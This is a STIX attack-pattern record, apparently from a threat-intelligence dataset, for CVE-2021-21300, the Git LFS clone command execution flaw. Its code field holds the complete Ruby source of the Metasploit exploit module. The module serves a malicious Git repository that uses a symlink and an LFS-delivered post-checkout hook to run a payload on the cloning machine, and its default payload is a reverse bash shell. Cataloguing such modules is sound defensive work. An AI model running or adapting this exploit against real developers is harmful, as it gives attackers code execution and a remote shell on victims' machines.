{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--45fd6472-c3f5-48eb-b352-e13056714aab",
    "created": "2024-08-14T17:07:58.761498Z",
    "modified": "2024-08-14T17:07:58.761503Z",
    "name": "Git LFS Clone Command Exec",
    "description": " Git clients that support delay-capable clean / smudge filters and symbolic links on case-insensitive file systems are vulnerable to remote code execution while cloning a repository.  Usage of clean / smudge filters through Git LFS and a case-insensitive file system changes the checkout order of repository files which enables the placement of a Git hook in the `.git/hooks` directory. By default, this module writes a `post-checkout` script so that the payload will automatically be executed upon checkout of the repository.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/git_lfs_clone_command_exec.rb",
            "external_id": "git_lfs_clone_command_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-21300"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2021/Apr/60"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/Foone/status/1369500506469527552?s=20"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Git\n  include Msf::Exploit::Git::SmartHttp\n  include Msf::Exploit::Git::Lfs\n  include Msf::Exploit::Remote::HttpServer\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Git LFS Clone Command Exec',\n        'Description' => %q{\n          Git clients that support delay-capable clean / smudge\n          filters and symbolic links on case-insensitive file systems are\n          vulnerable to remote code execution while cloning a repository.\n\n          Usage of clean / smudge filters through Git LFS and a\n          case-insensitive file system changes the checkout order\n          of repository files which enables the placement of a Git hook\n          in the `.git/hooks` directory. By default, this module writes\n          a `post-checkout` script so that the payload will automatically\n          be executed upon checkout of the repository.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Johannes Schindelin', # Discovery\n          'Matheus Tavares', # Discovery\n          'Shelby Pace' # Metasploit module\n        ],\n        'References' => [\n          [ 'CVE', '2021-21300' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2021/Apr/60' ],\n          [ 'URL', 'https://twitter.com/Foone/status/1369500506469527552?s=20' ]\n        ],\n        'DisclosureDate' => '2021-04-26',\n        'Platform' => [ 'unix' ],\n        'Arch' => ARCH_CMD,\n        'Targets' => [\n          [\n            'Git for MacOS, Windows',\n            {\n              'Platform' => [ 'unix' ],\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }\n            }\n          ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_SAFE ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'SideEffects' => [ ARTIFACTS_ON_DISK, SCREEN_EFFECTS ]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('GIT_URI', [ false, 'The URI to use as the malicious Git instance (empty for random)', '' ])\n      ]\n    )\n\n    deregister_options('RHOSTS', 'RPORT')\n  end\n\n  def exploit\n    setup_repo_structure\n    super\n  end\n\n  def setup_repo_structure\n    link_content = '.git/hooks'\n    link_name = Rex::Text.rand_text_alpha(8..12).downcase\n    link_obj = GitObject.build_blob_object(link_content)\n\n    dir_name = link_name.upcase\n    git_attr = '.gitattributes'\n\n    git_hook = 'post-checkout'\n    @hook_payload = \"#!/bin/sh\\n#{payload.encoded}\"\n    ptr_file = generate_pointer_file(@hook_payload)\n\n    # need to initially send the pointer file\n    # then send the actual object when Git LFS requests it\n    git_hook_ptr = GitObject.build_blob_object(ptr_file)\n\n    git_attr_content = \"#{dir_name}/#{git_hook} filter=lfs diff=lfs merge=lfs\"\n    git_attr_obj = GitObject.build_blob_object(git_attr_content)\n\n    sub_file_content = Rex::Text.rand_text_alpha(0..150)\n    sub_file_name = Rex::Text.rand_text_alpha(8..12)\n    sub_file_obj = GitObject.build_blob_object(sub_file_content)\n\n    register_dir_for_cleanup('.git')\n    register_files_for_cleanup(git_attr, link_name)\n\n    # create subdirectory which holds payload\n    sub_tree =\n      [\n        {\n          mode: '100644',\n          file_name: sub_file_name,\n          sha1: sub_file_obj.sha1\n        },\n        {\n          mode: '100755',\n          file_name: git_hook,\n          sha1: git_hook_ptr.sha1\n        }\n      ]\n\n    sub_tree_obj = GitObject.build_tree_object(sub_tree)\n\n    # root of repository\n    tree_ent =\n      [\n        {\n          mode: '100644',\n          file_name: git_attr,\n          sha1: git_attr_obj.sha1\n        },\n        {\n          mode: '040000',\n          file_name: dir_name,\n          sha1: sub_tree_obj.sha1\n        },\n        {\n          mode: '120000',\n          file_name: link_name,\n          sha1: link_obj.sha1\n        }\n      ]\n    tree_obj = GitObject.build_tree_object(tree_ent)\n    commit = GitObject.build_commit_object(tree_sha1: tree_obj.sha1)\n\n    @git_objs =\n      [\n        commit, tree_obj, sub_tree_obj,\n        sub_file_obj, git_attr_obj, git_hook_ptr,\n        link_obj\n      ]\n\n    @refs =\n      {\n        'HEAD' => 'refs/heads/master',\n        'refs/heads/master' => commit.sha1\n      }\n  end\n\n  def create_git_uri\n    \"/#{Faker::App.name.downcase}.git\".gsub(' ', '-')\n  end\n\n  def primer\n    @git_repo_uri = datastore['GIT_URI'].empty? ? create_git_uri : datastore['GIT_URI']\n    @git_addr = URI.parse(get_uri).merge(@git_repo_uri)\n    print_status(\"Git repository to clone: #{@git_addr}\")\n    hardcoded_uripath(@git_repo_uri)\n    hardcoded_uripath(\"/#{Digest::SHA256.hexdigest(@hook_payload)}\")\n  end\n\n  def on_request_uri(cli, req)\n    if req.uri.include?('git-upload-pack')\n      request = Msf::Exploit::Git::SmartHttp::Request.parse_raw_request(req)\n      case request.type\n      when 'ref-discovery'\n        response = send_refs(request)\n      when 'upload-pack'\n        response = send_requested_objs(request)\n      else\n        fail_with(Failure::UnexpectedReply, 'Git client did not send a valid request')\n      end\n    else\n      response = handle_lfs_objects(req)\n      unless response.code == 200\n        cli.send_response(response)\n        fail_with(Failure::UnexpectedReply, 'Failed to respond to Git client\\'s LFS request')\n      end\n    end\n\n    cli.send_response(response)\n  end\n\n  def send_refs(req)\n    fail_with(Failure::UnexpectedReply, 'Git client did not perform a clone') unless req.service == 'git-upload-pack'\n\n    response = get_ref_discovery_response(req, @refs)\n    fail_with(Failure::UnexpectedReply, 'Failed to build a proper response to the ref discovery request') unless response\n\n    response\n  end\n\n  def send_requested_objs(req)\n    upload_pack_resp = get_upload_pack_response(req, @git_objs)\n    unless upload_pack_resp\n      fail_with(Failure::UnexpectedReply, 'Could not generate upload-pack response')\n    end\n\n    upload_pack_resp\n  end\n\n  def handle_lfs_objects(req)\n    git_hook_obj = GitObject.build_blob_object(@hook_payload)\n\n    case req.method\n    when 'POST'\n      print_status('Sending payload data...')\n      response = get_batch_response(req, @git_addr, git_hook_obj)\n      fail_with(Failure::UnexpectedReply, 'Client request was invalid') unless response\n    when 'GET'\n      print_status('Sending LFS object...')\n      response = get_requested_obj_response(req, git_hook_obj)\n      fail_with(Failure::UnexpectedReply, 'Client sent invalid request') unless response\n    else\n      fail_with(Failure::UnexpectedReply, 'Unable to handle client\\'s request')\n    end\n\n    response\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-04-26",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}